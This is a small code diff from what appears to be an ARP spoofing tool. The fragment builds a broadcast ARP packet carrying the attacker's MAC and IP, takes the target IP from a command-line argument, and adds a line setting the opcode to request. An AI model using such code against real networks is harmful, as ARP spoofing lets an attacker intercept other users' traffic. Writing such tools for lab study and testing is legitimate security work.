@@ -54,6 +54,7 @@ int main(int argc, char *argv[])
     ArpPacket spoof;
     spoof.setEtherDestMac((u_char*)"FF:FF:FF:FF:FF:FF");
     spoof.setEtherSourceMac(attackerMAC);
+    spoof.setArpOpcode(ARPOP_REQUEST);
     spoof.setArpSenderIP(attackerIP);
     spoof.setArpSenderMac(attackerMAC);
     spoof.setArpTargetIP((u_char*)argv[2]);
